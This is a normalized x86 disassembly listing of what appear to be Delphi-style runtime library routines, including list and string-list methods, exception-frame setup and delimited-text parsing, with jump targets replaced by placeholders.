call sub_404118
retn
sub_4197d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_419cbc
mov edx ebx
mov eax esi
call sub_419c54
sub_419800
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4196d8
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_418dec
mov dl 0x1
mov eax ebx
call sub_4196b4
sub_419830
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_4195e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_41987c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_4195e8
mov eax [ esi + 0x8 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
mov eax esi
call sub_419994
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4198c8
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4198e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4192f4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_419966
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419994
mov eax esi
call sub_419a38
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_419a40
push eax
mov eax [ ebp - 0x4 ]
call sub_4198c8
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_419994
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4199ee
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_418de0
call sub_40331c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_419a18
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419a40
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_419a54
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419b02
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_40326c
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_40437c
mov eax ebx
mov si 0xffff
call sub_403518
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b09
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
mov eax ebx
mov si 0xffff
call sub_403518
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403518
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_419b1c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_404498
sub_419b1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_40416c
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_403518
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403544
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403544
call sub_414e50
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4026ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419c19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403544
mov edx [ ebp - 0xc ]
call sub_415054
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40270c
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_4150d8
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_40437c
sub_419c38
push ebx
push esi
mov esi edx
call sub_4198c8
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax ebx
pop esi
pop ebx
retn
sub_419c54
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4034a8
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418b9c
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_419984
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4195e8
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_418c84
sub_419cbc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_418de0
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418e94
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418be8
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_4195e8
mov eax ebx
call sub_419984
pop edi
pop esi
pop ebx
retn
sub_419d18
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418cf8
mov edx eax
mov cl 0x2
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418cf8
call sub_40331c
pop edi
pop esi
pop ebx
retn
sub_419d5c
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_419d80
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_419830
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_419dc8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41ac2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_419df8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_419e1c
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_419e48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419eef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419f98
xor eax eax
push ebp
push sub_419ed2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419ed9
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_419f00
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4192f4
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_419f98
xor eax eax
push ebp
push sub_419f80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
sub_419fb0
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41a068
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41a008
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41aac4
mov eax [ ebp - 0x8 ]
push eax
push sub_41ad74
push ebp
call sub_419fb0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a068
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a0fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a104
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40413c
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404524
jne r-xdata
sub_41a114
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41a110
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
jmp sub_403ad0
sub_41a14c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a194
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405f7c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41a114
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a19b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_41a1a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a27c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419f98
xor eax eax
push ebp
push sub_41a25a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a261
mov eax [ ebp - 0x4 ]
call sub_41a054
retn
sub_41a294
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5 ]
mov [ ebp - 0x6 ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x6 ]
mov [ ebp - 0x7 ] al
mov dl 0x2c
mov eax [ ebp - 0x4 ]
call sub_41ae28
mov dl 0x22
mov eax [ ebp - 0x4 ]
call sub_41ae44
xor eax eax
push ebp
push sub_41a310
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41a31c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a317
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x5 ] dl
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x7 ]
mov [ eax + 0x6 ] dl
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x4 ] dl
retn
sub_41a31c
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41a4dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
cmp ebx 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404118
dec ebx
test ebx ebx
jl r-xdata
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4043d8
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx 0x1
call sub_404678
inc ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
mov eax esi
call sub_41ae10
mov edx eax
lea eax [ ebp - 0x18 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
call sub_402be4
mov eax esi
call sub_41ae10
mov edx eax
lea eax [ ebp - 0x20 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
mov cl 0x2
call sub_402bb4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40437c
jmp r-xdata
push esi
mov esi r-xdata
lea edi [ ebp - 0x40 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov eax esi
call sub_41ae10
mov edx eax
lea eax [ ebp - 0x60 ]
mov cl 0x20
call sub_402e24
mov eax esi
call sub_41adf8
push eax
pop eax
and eax 0xff
bts [ ebp - 0x60 ] eax
lea edx [ ebp - 0x60 ]
lea eax [ ebp - 0x40 ]
mov cl 0x20
call sub_402e5c
mov al [ ebx ]
and eax 0xff
bt [ ebp - 0x40 ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4e3
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x14 ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_404118
retn
push ebx
call CharNextA
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push [ eax ]
push [ ebp - 0x8 ]
mov eax esi
call sub_41adf8
mov edx eax
lea eax [ ebp - 0x68 ]
call sub_404300
push [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404498
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax esi
call sub_41ae10
mov edx eax
lea ecx [ ebp - 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_408338
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x8 ]
call sub_4041b0
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4045d8
mov ebx eax
jmp r-xdata
sub_41a4ef
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41a555
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4045d8
call sub_408dc4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a55c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_41a564
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a66f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4041b0
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404208
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a676
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_40413c
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4043d8
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4043d8
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4043d8
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028e8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028e8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4043d8
mov ebx eax
test ebx ebx
je r-xdata
sub_41a68c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a70b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_404118
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043d8
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404638
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a712
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_41a718
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a790
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a797
lea eax [ ebp - 0xc ]
call sub_404118
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41a7a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a867
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404638
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41ae6c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404300
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40ca64
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a86e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_41a878
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41a8ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
